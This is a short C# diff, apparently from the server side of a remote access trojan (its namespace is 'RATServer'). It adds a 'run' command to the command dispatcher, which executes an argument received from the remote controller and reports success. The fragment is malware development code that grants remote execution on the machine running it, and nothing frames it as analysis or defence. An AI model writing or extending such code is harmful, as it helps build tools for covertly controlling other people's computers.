@@ -85,6 +85,11 @@ namespace RATServer
                             r.Type = "Message"; 
                             r.Msg = "Message Success";
                             break;
+                        case "run":
+                            Functions.Run(c.Args[0]);
+                            r.Type = "Message";
+                            r.Msg = "Run Success";
+                            break;
                         default:
                             break;
                     }                 
